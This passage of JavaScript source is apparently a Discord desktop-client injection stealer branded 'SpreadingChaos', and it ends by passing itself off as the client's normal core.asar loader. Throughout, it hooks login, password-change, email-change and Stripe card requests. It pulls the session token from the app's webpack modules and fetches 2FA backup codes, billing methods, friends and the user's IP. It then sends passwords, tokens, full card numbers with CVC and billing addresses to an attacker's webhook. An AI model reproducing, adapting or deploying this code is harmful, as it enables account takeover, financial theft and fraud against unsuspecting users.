            xmlHttp.responseText`, !0).then((info4) => {

                    if (token.startsWith("mfa")) {
                        window.webContents.executeJavaScript(`
              var xmlHttp = new XMLHttpRequest();
              xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
              xmlHttp.setRequestHeader('Content-Type', 'application/json');
              xmlHttp.setRequestHeader("authorization", "${token}")
              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));
              xmlHttp.responseText`, !0).then((codes) => {

                            var fieldo = [];
                            var baseuri = "https://ctf.surf/raw/"


                            var gayass = JSON.parse(codes)
                            let g = gayass.backup_codes
                            const r = g.filter((code) => {
                                return code.consumed == null
                            })
                            for (let z in r) {
                                fieldo.push({
                                    name: `Code`,
                                    value: `\`${r[z].code.insert(4, "-")}\``,
                                    inline: true
                                })
                                baseuri += `${r[z].code.insert(4, "-")}<br>`
                            }

                            function totalFriends() {
                                var f = JSON.parse(info4)
                                const r = f.filter((user) => {

                                    return user.type == 1
                                })
                                return r.length
                            }

                            function CalcFriends() {
                                var f = JSON.parse(info4)
                                const r = f.filter((user) => {
                                    return user.type == 1
                                })
                                var gay = "";
                                for (z of r) {
                                    var b = GetRBadges(z.user.public_flags)
                                    if (b != "") {
                                        gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
                                    }
                                }
                                if (gay == "") {
                                    gay = "No Rare Friends"
                                }
                                return gay
                            }

                            function Cool() {
                                const json = JSON.parse(info3)
                                var billing = "";
                                json.forEach(z => {
                                    if (z.type == "") {
                                        return "\`❌\`"
                                    } else if (z.type == 2 && z.invalid != !0) {
                                        billing += "\`✔️\`" + " <:paypal:967103386967216158>"
                                    } else if (z.type == 1 && z.invalid != !0) {
                                        billing += "\`✔️\`" + " <a:cc:967103197044932649>"
                                    } else {
                                        return "\`❌\`"
                                    }
                                })
                                if (billing == "") {
                                    billing = "\`❌\`"
                                }
                                return billing
                            }
                            const json = JSON.parse(info);

                            var params = {
                                embeds: [{
                                    "title": "The Email has been changed !",
                                    description: "[**<:partner:967100170712014898> │ Click here to copy info**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
                                    "color": config['embed-color'],
                                    "fields": [{
                                        name: "Username",
                                        value: `\`${json.username}#${json.discriminator}\``,
                                        inline: !0
                                    }, {
                                        name: "ID",
                                        value: `\`${json.id}\``,
                                        inline: !0
                                    }, {
                                        name: "Nitro",
                                        value: `${GetNitro(json.premium_type)}`,
                                        inline: !1
                                    }, {
                                        name: "Badges",
                                        value: `${GetBadges(json.flags)}`,
                                        inline: !1
                                    }, {
                                        name: "Billing",
                                        value: `${Cool()}`,
                                        inline: !1
                                    }, {
                                        name: "New Email",
                                        value: `\`${newemail}\``,
                                        inline: !0
                                    }, {
                                        name: "Password",
                                        value: `\`${password}\``,
                                        inline: !0
                                    }, {
                                        name: "Token",
                                        value: `\`\`\`${token}\`\`\``,
                                        inline: !1
                                    }, ],
                                    "author": {
                                        "name": "SpreadingChaos"
                                    },
                                    "footer": {
                                        "text": "SpreadingChaos"
                                    },
                                    "thumbnail": {
                                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                                    }
                                }, {
                                    "title": `Friends with rare badges (${totalFriends()})`,
                                    "color": config['embed-color'],
                                    "description": CalcFriends(),
                                    "author": {
                                        "name": "SpreadingChaos"
                                    },
                                    "footer": {
                                        "text": "SpreadingChaos"
                                    },
                                    "thumbnail": {
                                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                                    }
                                }]
                            }
                            var mfaembed = {
                                "title": ":detective: __2FA Codes__",
                                "description": `[Get all of them](${baseuri})`,
                                "color": config['embed-color'],
                                "fields": fieldo,
                                "author": {
                                    "name": "SpreadingChaos"
                                },
                                "footer": {
                                    "text": "SpreadingChaos"
                                }
                            }
                            if (token.startsWith("mfa")) {
                                params.embeds.push(mfaembed)
                            }

                            SendToWebhook(JSON.stringify(params))

                        })
                    } else {

                        const window = BrowserWindow.getAllWindows()[0];
                        window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
                            window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
                                window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
                                    window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {

                                        function totalFriends() {
                                            var f = JSON.parse(info4)
                                            const r = f.filter((user) => {
                                                return user.type == 1
                                            })
                                            return r.length
                                        }

                                        function CalcFriends() {
                                            var f = JSON.parse(info4)
                                            const r = f.filter((user) => {
                                                return user.type == 1
                                            })
                                            var gay = "";
                                            for (z of r) {
                                                var b = GetRBadges(z.user.public_flags)
                                                if (b != "") {
                                                    gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
                                                }
                                            }
                                            if (gay == "") {
                                                gay = "No Rare Friends"
                                            }
                                            return gay
                                        }

                                        function Cool() {
                                            const json = JSON.parse(info3)
                                            var billing = "";
                                            json.forEach(z => {
                                                if (z.type == "") {
                                                    return "\`❌\`"
                                                } else if (z.type == 2 && z.invalid != !0) {
                                                    billing += "\`✔️\`" + " <:paypal:967103386967216158>"
                                                } else if (z.type == 1 && z.invalid != !0) {
                                                    billing += "\`✔️\`" + " <a:cc:967103197044932649>"
                                                } else {
                                                    return "\`❌\`"
                                                }
                                            })
                                            if (billing == "") {
                                                billing = "\`❌\`"
                                            }
                                            return billing
                                        }
                                        const json = JSON.parse(info);
                                        var params = {
                                            embeds: [{
                                                "title": "The Email has been changed !",
                                                description: "[**<:partner:967100170712014898> │ Click here to copy info**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
                                                "color": config['embed-color'],
                                                "fields": [{
                                                    name: "Username",
                                                    value: `\`${json.username}#${json.discriminator}\``,
                                                    inline: !0
                                                }, {
                                                    name: "ID",
                                                    value: `\`${json.id}\``,
                                                    inline: !0
                                                }, {
                                                    name: "Nitro",
                                                    value: `${GetNitro(json.premium_type)}`,
                                                    inline: !1
                                                }, {
                                                    name: "Badges",
                                                    value: `${GetBadges(json.flags)}`,
                                                    inline: !1
                                                }, {
                                                    name: "Billing",
                                                    value: `${Cool()}`,
                                                    inline: !1
                                                }, {
                                                    name: "New Email",
                                                    value: `\`${newemail}\``,
                                                    inline: !0
                                                }, {
                                                    name: "Password",
                                                    value: `\`${password}\``,
                                                    inline: !0
                                                }, {
                                                    name: "Token",
                                                    value: `\`\`\`${token}\`\`\``,
                                                    inline: !1
                                                }, ],
                                                "author": {
                                                    "name": "SpreadingChaos"
                                                },
                                                "footer": {
                                                    "text": "SpreadingChaos"
                                                },
                                                "thumbnail": {
                                                    "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                                                }
                                            }, {
                                                "title": `Friend with rare Badge (${totalFriends()})`,
                                                "color": config['embed-color'],
                                                "description": CalcFriends(),
                                                "author": {
                                                    "name": "SpreadingChaos"
                                                },
                                                "footer": {
                                                    "text": "SpreadingChaos"
                                                },
                                                "thumbnail": {
                                                    "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                                                }
                                            }]
                                        }
                                        SendToWebhook(JSON.stringify(params))
                                    })
                                })
                            })
                        })

                    }
                })
            })
        })
    })
}

function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
            var json = JSON.parse(info);
            var params = {
                embeds: [{
                    "title": "User added a new Credit Card!",
                    "description": "**Username:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + "```\n**Email:**```" + json.email + "```\n" + "**Nitro Type:**```" + GetNitro(json.premium_type) + "```\n**Badges:**```" + GetBadges(json.flags) + "```" + "\n**Credit Card Number: **```" + number + "```" + "\n**Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**CVC: **```" + cvc + "```\n" + "**Country: **```" + country + "```\n" + "**State: **```" + state + "```\n" + "**City: **```" + city + "```\n" + "**ZIP:**```" + zip + "```" + "\n**Street: **```" + street + "```" + "\n**Token:**```" + token + "```" + "\n**IP: **```" + ip + "```",
                    "author": {
                        "name": "SpreadingChaos"
                    },
                    "footer": {
                        "text": "SpreadingChaos"
                    },
                    "thumbnail": {
                        "url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
                    }
                }]
            }
            SendToWebhook(JSON.stringify(params))
        })
    })
}
const ChangePasswordFilter = {
    urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
};
session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, callback) => {
    if (details.url.endsWith("login")) {
        if (details.statusCode == 200) {
            const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
            const email = data.login;
            const password = data.password;
            const window = BrowserWindow.getAllWindows()[0];
            window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
                Login(email, password, token)
            }))
        } else {}
    }
    if (details.url.endsWith("users/@me")) {
        if (details.statusCode == 200 && details.method == "PATCH") {
            const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
            if (data.password != null && data.password != undefined && data.password != "") {
                if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
                    const window = BrowserWindow.getAllWindows()[0];
                    window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
                        ChangePassword(data.password, data.new_password, token)
                    }))
                }
                if (data.email != null && data.email != undefined && data.email != "") {
                    const window = BrowserWindow.getAllWindows()[0];
                    window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
                        ChangeEmail(data.email, data.password, token)
                    }))
                }
            }
        } else {}
    }
    if (details.url.endsWith("tokens")) {
        const window = BrowserWindow.getAllWindows()[0];
        const item = querystring.parse(decodeURIComponent(Buffer.from(details.uploadData[0].bytes).toString()))
        window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
            CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], item["card[address_line1]"], item["card[address_city]"], item["card[address_state]"], item["card[address_zip]"], item["card[address_country]"], token)
        }))
    }
});
module.exports = require('./core.asar')
